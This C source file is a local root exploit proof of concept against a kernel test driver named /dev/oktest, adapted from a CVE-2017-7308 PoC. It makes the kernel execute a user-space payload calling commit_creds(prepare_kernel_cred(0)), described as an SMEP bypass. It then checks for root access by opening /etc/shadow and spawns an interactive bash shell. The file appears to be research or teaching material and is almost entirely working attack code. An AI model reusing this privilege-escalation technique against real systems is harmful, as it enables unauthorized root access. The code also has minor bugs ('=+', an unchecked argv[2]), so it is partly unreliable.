/*
 * Incorporates code from Andrey Konovalov's poc for local root exploit 
 * for CVE-2017-7308
 *
 * nigel.edwards@hpe.com
 */

#define _GNU_SOURCE

#include <stdbool.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define DEVICE_NAME "oktest"
#define DEVICE_PATH "/dev/oktest"

#define MAGIC_NO '4'
static int count = 0;
static unsigned long commit_cred = 0xffffffffad0a4010;

static unsigned long prepare_kernel_cred = 0xffffffffad0a4510;

/* 
 * Set the message of the device driver 
 */
#define OKTEST_EXEC _IOW(MAGIC_NO, 0, void(*)(void))

void func1(void) {
	count =+ 1;
}

typedef unsigned long __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred); 
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);


void get_root_payload(void) {
	((_commit_creds)(commit_cred))(
		((_prepare_kernel_cred)(prepare_kernel_cred))(0)
	);
}

void exec_shell() {
	char *shell = "/bin/bash";
	char *args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

void fork_shell() {
	pid_t rv;

	rv = fork();
	if (rv == -1) {
		perror("[-] fork()");
		exit(EXIT_FAILURE);
	}

	if (rv == 0) {
		exec_shell();
	}
}

bool is_root() {
	int fd = open("/etc/shadow", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}

void check_root() {
	printf("[.] checking if we got root\n");

	if (!is_root()) {
		printf("[-] something went wrong =(\n");
		return;
	}

	printf("[+] got r00t ^_^\n");

	exec_shell();
}

void usage(char *c)
{
	printf("Usage: %s <address of commit_creds> "
	       "<address of prepare_kernel_cred>\n", c);
	exit(-1);
}

int main(int argc, char **argv)
{
	int fd;
	char *p;

	if (argc < 2)
		usage(argv[0]);
	commit_cred = strtoul(argv[1], &p, 16);
	prepare_kernel_cred = strtoul(argv[2], &p, 16);
	
	if((fd = open(DEVICE_PATH, O_RDWR)) == -1 ){
		printf("Failed to open (%s) errno (%d)\n", DEVICE_PATH, errno);
		return -1;
	}
	printf("Count is %d\n", count);
	printf("Calling OKTEST_EXEC to bypass SMEP with func1\n");
	ioctl(fd, OKTEST_EXEC, func1);
	printf("Count is %d\n", count);
	
	printf("Calling OKTEST_EXEC to bypass SMEP with get_root_payload\n");
	ioctl(fd, OKTEST_EXEC, get_root_payload);

	printf("OKTEST_EXEC done\n");

	check_root();

	return 0;
}

